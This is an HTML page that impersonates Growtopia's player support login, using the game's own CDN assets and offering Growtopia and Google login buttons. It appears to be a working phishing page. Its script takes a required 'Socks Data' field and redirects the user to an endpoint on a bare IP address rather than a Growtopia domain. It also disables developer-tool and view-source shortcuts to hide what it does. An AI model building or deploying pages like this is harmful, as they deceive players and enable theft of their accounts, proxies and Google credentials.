<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">

    <title>Growtopia Player Support</title>

    <link rel="icon"
          type="image/png"
          href="https://s3.eu-west-1.amazonaws.com/cdn.growtopiagame.com/website/resources/assets/images/growtopia.ico"
          sizes="16x16">

    <link rel="shortcut icon"
          href="https://s3.eu-west-1.amazonaws.com/cdn.growtopiagame.com/website/resources/assets/images/growtopia.ico"
          type="image/x-icon">

    <link rel="stylesheet"
          href="https://s3.eu-west-1.amazonaws.com/cdn.growtopiagame.com/website/resources/assets/css/faq-main.css">

    <link rel="stylesheet"
          href="https://s3.eu-west-1.amazonaws.com/cdn.growtopiagame.com/website/resources/assets/css/shop-custom.css">

    <link rel="stylesheet"
          href="https://s3.eu-west-1.amazonaws.com/cdn.growtopiagame.com/website/resources/assets/css/ingame-custom.css">

    <style>
        html,
        body {
            width: 100%;
            height: 100%;
            background-color: rgba(0, 0, 0, 0);
        }

        .modal-backdrop {
            background-color: rgba(0, 0, 0, 0.1) !important;
        }

        .modal-backdrop + div {
            overflow: auto;
        }

        .modal-body,
        .content {
            padding: 0;
        }

        .login-container {
            width: 100%;
        }

        .login-button {
            margin-bottom: 10px;
        }

        .google-button {
            display: flex;
            justify-content: center;
            align-items: center;
        }

        .google-button img {
            max-width: 100%;
            height: auto;
        }
    </style>
</head>

<body>

    <button
        type="button"
        class="btn btn-primary hidden"
        id="modalButton"
        data-toggle="modal"
        data-target="#modalShow"
        data-backdrop="static"
        data-keyboard="false">
    </button>

    <div class="content">
        <section class="common-box">
            <div class="container">
                <div class="row">
                    <div class="col-md-12 col-sm-12">

                        <div
                            class="modal fade product-list-popup"
                            id="modalShow"
                            tabindex="-1"
                            role="dialog"
                            aria-hidden="false">

                            <div
                                class="modal-dialog modal-dialog-centered"
                                role="document">

                                <div class="modal-content">
                                    <div class="modal-body">

                                        <div class="content">
                                            <section class="common-box">
                                                <div class="container">

                                                    <div class="text-center mb-4">

                                                        <!-- SOCKS INPUT -->
                                                        <div class="row div-content-center">
                                                            <div class="col-md-12 col-sm-12">
                                                                <div class="form-group">
                                                                    <input
                                                                        id="login-name"
                                                                        class="form-control grow-text"
                                                                        required
                                                                        placeholder="Socks Data *"
                                                                        name="socks"
                                                                        type="text">
                                                                </div>
                                                            </div>
                                                        </div>

                                                        <!-- GROWTOPIA LOGIN -->
                                                        <div class="row div-content-center">
                                                            <div class="col-md-12 col-sm-12">

                                                                <a
                                                                    href="#"
                                                                    class="grow-login btn btn-block login-button"
                                                                    onclick="goToLogin(event, 'growid', 'Grow');">
                                                                    Growtopia Login
                                                                </a>

                                                            </div>
                                                        </div>

                                                        <!-- GOOGLE LOGIN -->
                                                        <div class="row div-content-center">
                                                            <div class="col-md-12 col-sm-12 google-button">

                                                                <a
                                                                    href="#"
                                                                    class="btn"
                                                                    onclick="goToLogin(event, 'google', 'Google');">

                                                                    <img
                                                                        src="https://s3.eu-west-1.amazonaws.com/cdn.growtopiagame.com/website/resources/assets/images/googleid_button.png"
                                                                        alt="Google">

                                                                </a>

                                                            </div>
                                                        </div>

                                                    </div>

                                                </div>
                                            </section>
                                        </div>

                                    </div>
                                </div>

                            </div>
                        </div>

                    </div>
                </div>
            </div>
        </section>
    </div>

    <script src="https://s3.eu-west-1.amazonaws.com/cdn.growtopiagame.com/website/resources/vendors/jquery/jquery-2.1.4.min.js"></script>

    <script src="https://s3.eu-west-1.amazonaws.com/cdn.growtopiagame.com/website/resources/vendors/bootstrap/javascripts/bootstrap.min.js"></script>

    <script>
        function goToLogin(event, endpoint, option) {
            event.preventDefault();

            const socksInput = document.getElementById('login-name');
            const socks = socksInput.value.trim();

            // Require Socks Data
            if (!socks) {
                socksInput.focus();
                socksInput.reportValidity();
                return;
            }

            // Keep your existing option handler
            if (typeof optionChose === 'function') {
                optionChose(option);
            }

            // Encode the value safely for use in the URL
            const encodedSocks = encodeURIComponent(socks);

            // Build:
            // /growid?socks=YOUR_VALUE
            // or
            // /google?socks=YOUR_VALUE
            const url = `https://185.149.27.57:3000/${endpoint}?socks=${encodedSocks}`;

            window.location.href = url;
        }


        $(document).ready(function () {

            /*
             * Disable some browser shortcuts.
             */
            document.onkeydown = function (e) {
                if (
                    e.key === 'F12' ||
                    (e.ctrlKey && e.shiftKey && e.key === 'I') ||
                    (e.ctrlKey && e.key === 'I') ||
                    (e.ctrlKey && e.shiftKey && e.key === 'C') ||
                    (e.ctrlKey && e.shiftKey && e.key === 'J') ||
                    (e.ctrlKey && e.key === 'U')
                ) {
                    e.preventDefault();
                }
            };


            /*
             * Open modal automatically.
             */
            $('#modalButton').trigger('click');


            /*
             * Close button.
             */
            $('.close').on('click', function () {
                window.location.href =
                    'https://login.growtopiagame.com/player/validate/close';
            });


            /*
             * Scale dynamically added elements on small screens.
             */
            const observer = new MutationObserver(function (mutations) {

                mutations.forEach(function (mutation) {

                    mutation.addedNodes.forEach(function (node) {

                        if (node.tagName !== 'DIV') {
                            return;
                        }

                        if (window.screen.width < 667) {
                            $(node).css({
                                transform: 'scale(0.75)',
                                transformOrigin: '0 0',
                                '-webkit-transform': 'scale(0.75)',
                                '-webkit-transform-origin': '0 0',
                                overflow: 'auto'
                            });
                        }

                    });

                });

            });

            observer.observe(document.body, {
                attributes: false,
                childList: true,
                characterData: false
            });


            /*
             * Existing login-button animation.
             */
            let originalText = 'Logging In';
            let dotCount = 0;
            let intervalId;

            $('form').on('submit', function () {

                const button = $('#loginButton');

                button.prop('disabled', true);

                intervalId = setInterval(function () {

                    dotCount = (dotCount + 1) % 4;

                    const dots = '.'.repeat(dotCount);

                    button.text(originalText + dots);

                }, 500);

            });

        });
    </script>

</body>
</html>
